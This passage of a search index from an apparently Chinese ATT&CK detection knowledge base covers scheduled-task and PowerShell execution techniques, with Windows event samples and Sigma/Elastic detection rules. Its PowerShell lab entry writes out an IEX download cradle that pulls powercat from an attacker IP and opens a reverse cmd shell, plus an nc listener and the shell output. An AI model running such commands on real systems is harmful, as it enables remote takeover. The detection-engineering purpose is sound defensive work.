0\u548c\u5220\u9664\u4efb\u52a1\uff0c\u6309\u9700\u8981\u542f\u52a8\u548c\u505c\u6b62\u4efb\u52a1\uff0c\u663e\u793a\u548c\u66f4\u6539\u8ba1\u5212\u4efb\u52a1\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_3","text":"\u6682\u65e0\uff0c\u53c2\u8003\uff1a Schtasks\u547d\u4ee4\u8be6\u89e3","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_4","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002 Pre-Windows 2016/10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#sigma","text":"title: schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1 description: \u68c0\u6d4b\u53ef\u7591\u7684schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1 author: 12306Br0 references: - https://www.elastic.co/guide/en/siem/guide/current/local-scheduled-task-commands.html tags: - attack.persistence - attack.t1053-005 logsource: product: windows service: sysmon / \u5b89\u5168\u65e5\u5fd7 #\u81ea\u884c\u914d\u7f6e detection: selection: EventID: - 4688 #windows\u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa - 1 #windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa Process Name: 'schtasks.exe' CommandLine: - '/create' - '-create' - '/S' - '-s' - '/run' - '-run' - '/change' - '-change' condition: selection level: low","title":"Sigma"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#elastic-rule-query","text":"event.action:\"Process Create (rule: ProcessCreate)\" and process.name:schtasks.exe and process.args:(-change or -create or -run or -s or /S or /change or /create or /run)","title":"Elastic rule query"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_6","text":"\u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_7","text":"MITRE-ATT&CK-T1053-005 https://attack.mitre.org/techniques/T1053/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Powershell.exe\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u60a8\u53ef\u4ee5\u4f7f\u7528PowerShell.exe\u4ece\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u4f8b\u5982Cmd.exe\uff09\u7684\u547d\u4ee4\u884c\u542f\u52a8PowerShell\u4f1a\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u5728PowerShell\u547d\u4ee4\u884c\u542f\u52a8\u65b0\u4f1a\u8bdd\u3002\u4ece\u6b64\u5904\u9605\u8bfbMicrosoft Windows\u5b98\u65b9\u7f51\u7ad9\u4e0a\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672cpowershell\uff08V5\u4ee5\u4e0a\u542bV5\uff09\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u5177\u4f53\u7b56\u7565\u53ef\u53c2\u8003 powershell\u4e8b\u4ef6 \u3002\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\uff09 \u653b\u51fb\u5206\u6790 \u751f\u6210payload \u4e0b\u8f7d\u6211\u4eec\u672c\u6b21\u6d4b\u8bd5\u4e2d\u8981\u7528\u5230\u7684powercat\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/besimorhino/powercat \u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1 powercat\u76ee\u5f55\u4e0b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a root@12306Br0:~# python2 -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... \u6267\u884c\u76d1\u542c nc -lvp 1234 \u9776\u673a\u6267\u884cpayload powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\" \u53cd\u5f39shell root@12306Br0:/# nc -lvp 1234 listening on [any] 1234 ... 192.168.126.149: inverse host lookup failed: Unknown host connect to [192.168.126.146] from (UNKNOWN) [192.168.126.149] 49339 Microsoft Windows [\ufffd\u6c7e 6.1.7601] \ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd (c) 2009 Microsoft Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd \u6d4b\u8bd5\u7559\u75d5 #sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\" #win7\u5b89\u5168\u65e5\u5fd7 EventID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x330 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeLimited (3) EventID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa44 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe #Powershell V5(\u542bV5\u4ee5\u4e0a)\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u4ee5\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u91c7\u7528\u914d\u7f6ewindows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u6700\u540e\u8fbe\u5230\u76d1\u63a7\u6548\u679c\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: PowerShell\u901a\u8fc7url\u8fdb\u884c\u4e0b\u8f7d status: experimental description: \u68c0\u6d4b\u5728\u547d\u4ee4\u884c\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e0b\u8f7d\u547d\u4ee4\u7684Powershell\u8fdb\u7a0b tags: - attack.t1086 - attack.execution logsource: category: process_creation product: windows detection: selection: Image: '*\\powershell.exe' CommandLine: - '*new-object system.net.webclient).downloadstring(*' - '*new-object system.net.webclient).downloadfile(*' - '*new-object net.webclient).downloadstring(*' - '*new-object net.webclient).downloadfile(*' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: medium \u5efa\u8bae \u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Powershell.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#t1059-win-powershellexepayload","text":"","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Powershell.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"\u60a8\u53ef\u4ee5\u4f7f\u7528PowerShell.exe\u4ece\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u4f8b\u5982Cmd.exe\uff09\u7684\u547d\u4ee4\u884c\u542f\u52a8PowerShell\u4f1a\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u5728PowerShell\u547d\u4ee4\u884c\u542f\u52a8\u65b0\u4f1a\u8bdd\u3002\u4ece\u6b64\u5904\u9605\u8bfbMicrosoft Windows\u5b98\u65b9\u7f51\u7ad9\u4e0a\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672cpowershell\uff08V5\u4ee5\u4e0a\u542bV5\uff09\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u5177\u4f53\u7b56\u7565\u53ef\u53c2\u8003 powershell\u4e8b\u4ef6 \u3002\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"\u4e0b\u8f7d\u6211\u4eec\u672c\u6b21\u6d4b\u8bd5\u4e2d\u8981\u7528\u5230\u7684powercat\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/besimorhino/powercat","title":"\u751f\u6210payload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#http","text":"powercat\u76ee\u5f55\u4e0b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a root@12306Br0:~# python2 -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ...","title":"\u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"nc -lvp 1234","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#payload_1","text":"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\"","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"root@12306Br0:/# nc -lvp 1234 listening on [any] 1234 ... 192.168.126.149: inverse host lookup failed: Unknown host connect to [192.168.126.146] from (UNKNOWN) [192.168.126.149] 49339 Microsoft Windows [\ufffd\u6c7e 6.1.7601] \ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd (c) 2009 Microsoft Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"#sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\" #win7\u5b89\u5168\u65e5\u5fd7 EventID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x330 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeLimited (3) EventID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa44 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe #Powershell V5(\u542bV5\u4ee5\u4e0a)\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u4ee5\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u91c7\u7528\u914d\u7f6ewindows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u6700\u540e\u8fbe\u5230\u76d1\u63a7\u6548\u679c\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#sigma","text":"title: PowerShell\u901a\u8fc7url\u8fdb\u884c\u4e0b\u8f7d status: experimental description: \u68c0\u6d4b\u5728\u547d\u4ee4\u884c\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e0b\u8f7d\u547d\u4ee4\u7684Powershell\u8fdb\u7a0b tags: - attack.t1086 - attack.execution logsource: category: process_creation product: windows detection: selection: Image: '*\\powershell.exe' CommandLine: - '*new-object system.net.webclient).downloadstring(*' - '*new-object system.net.webclient).downloadfile(*' - '*new-object net.webclient).downloadstring(*' - '*new-object net.webclient).downloadfile(*' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/","text":"T1059-001-win-\u68c0\u6d4bPowershell2.0\u7248\u672c\u6267\u884c\u60c5\u51b5 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u67e5\u627ePowerShell\u7248\u672c2.0\u7684\u6267\u884c\u60c5\u51b5\uff0c\u800c\u4e0d\u662f\u67e5\u627e\u4f7f\u7528\u7248\u672c2\u7684\u65e7\u811a\u672c\uff0c\u6216\u67e5\u627e\u8bd5\u56fe\u4ece\u811a\u672c\u65e5\u5fd7\u8bb0\u5f55\u548cAMSI\u4e2d\u9690\u85cf\u7684\u653b\u51fb\u8005\u3002 Powershell v2.0 \u8be5\u7248\u672c\u8f83\u65e7\u4e14\u4e0d\u5b89\u5168\uff0c\u5728\u5b89\u88c5\u7248\u672c5\u65f6\u4e0d\u4f1a\u5220\u9664\u3002\u5982\u679c\u672a\u88ab\u5220\u9664\uff0c\u653b\u51fb\u8005\u4ecd\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4e0d\u5b89\u5168\u7684\u7248\u672c\u3002(powershell.exe -Version 2.0 -Command { } -ExecutionPolicy ) \u68c0\u6d4b\u65e5\u5fd7 Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565 \u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668; \u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows 